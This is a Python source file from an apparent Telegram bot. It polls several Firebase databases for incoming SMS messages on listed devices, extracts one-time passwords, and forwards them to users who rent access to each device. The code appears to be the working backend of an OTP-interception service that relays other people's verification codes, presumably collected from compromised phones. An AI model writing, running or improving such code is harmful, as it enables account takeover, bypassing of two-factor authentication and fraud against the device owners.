import asyncio, time, logging
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
import database as db
import services.firebase_service as fb_service
from utils.ui import sc

log = logging.getLogger("Scanner")
active_scans = {}

async def send_otp_to_user(bot, uid, service, otp, msg_text, rent_id):
    otp_msg = (
        f"🔔 <b>{sc('otp received')}!</b>\n\n"
        f"📱 <b>{sc('service')}:</b> {service}\n"
        f"🔑 <b>{sc('otp')}:</b> <code>{otp}</code>\n\n"
        f"🆔 <b>{sc('rent id')}:</b> <code>{rent_id}</code>\n"
        f"💬 <i>{msg_text[:60]}...</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{otp}", copy_text=CopyTextButton(text=otp))]])
    d = db.load_data()
    user = d["users"].get(str(uid))
    if user:
        hist = user.setdefault("otp_history", [])
        hist.insert(0, {"service": service, "otp": otp, "time": int(time.time())})
        user["otp_history"] = hist[:20]
        db.save_data(d)
    try: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
    except Exception: pass

async def get_latest_msgs(fb_url, auth, limit=5):
    all_msgs = {}
    clients = await fb_service.fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    for dev_id in clients.keys():
        msgs = await fb_service.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast={limit}", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0): all_msgs[dev_id] = v
    return all_msgs

async def start_scanner(bot):
    log.info("Background Scanner Started...")
    while True:
        try:
            d = db.load_data()
            leases = d.get("user_leases", {})
            device_to_users = {}
            current_time = time.time()
            
            for uid, lease in leases.items():
                if current_time < lease["expire_at"] and "dev_id" in lease:
                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
            
            if device_to_users:
                for fb in d.get("firebases", []):
                    latest_msgs = await get_latest_msgs(fb["url"], fb.get("auth"), limit=2)
                    for dev_id, msg in latest_msgs.items():
                        if dev_id not in device_to_users: continue
                        key = (fb["url"], dev_id)
                        msg_id = int(msg.get("id", 0))
                        old_id = active_scans.get(key, 0)
                        
                        if msg_id > old_id:
                            active_scans[key] = msg_id
                            if old_id != 0:
                                text_content = msg.get("message", "")
                                otp = fb_service.extract_otp(text_content)
                                if otp:
                                    service = fb_service.extract_service_name(text_content, msg.get("sender", ""))
                                    for uid in device_to_users[dev_id]:
                                        await send_otp_to_user(bot, uid, service, otp, text_content, dev_id)
            await asyncio.sleep(3)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(5)
